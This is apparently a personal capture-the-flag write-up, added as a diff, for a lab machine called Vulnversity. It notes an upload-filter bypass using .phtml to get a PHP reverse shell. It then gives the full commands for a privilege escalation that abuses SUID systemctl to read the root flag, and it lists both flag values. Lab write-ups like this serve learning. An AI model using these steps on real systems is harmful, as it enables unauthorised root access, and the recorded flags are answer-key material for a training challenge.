@@ -1,0 +1,72 @@
+Name : Padsala Tushal
+Machine: Vulnversity
+Date: 13/11/2021
+
+
+--Reconnaissance
+
+	-nmap scan
+		-port 3333 is running web server
+	
+	-gobuster
+		-found /internal
+			-it's has feature to upload file
+				-some extension is not allowed
+				 	-let's try to upload php revershell
+				 		-it's not allow to upload .php, .php3, .php4, .php5
+				 		-it's allow us to upload .phtml
+				 	
+				 		-/internal/uploads
+				 			-sucessfully got shell with php revshell
+
+
+-Privilege Escalation
+	-get tty shell
+	-user == bill
+	-userflag = 8bd7992fbe8a6ad22a63361004cfcedb
+
+
+	-after trying for priesc 
+
+	-suid file
+		-find / -perm -4000 -type f 2>/dev/null
+		-find / -perm -u=s -type f 2>/dev/null
+
+	-/bin/systemctl
+	->>>
+		//make service name TD
+			
+			TD=$(mktemp).service
+
+		//write service 
+			
+			echo '[Service]
+
+		//set service type to oneshot(this type service is short lived & systemd should wait for the process to exit before continuing on with other units.it's used for one-off tasks)
+			
+			Type=oneshot
+		
+
+		// ExecStart is script we want to execute
+
+			ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+		
+		// start of install section
+		
+			[Install]
+
+		// WantedBy is way to spacify how unit should be enabled
+
+			WantedBy=multi-user.target' > $TD
+		
+		// create link from etc/systemmd/system to current directory
+
+			/bin/systemctl link $TD
+		
+		// enable service
+
+			/bin/systemctl enable --now $TD
+
+
+	-root flag
+		a58ff8579f0a9270368d33a9966c7fd5
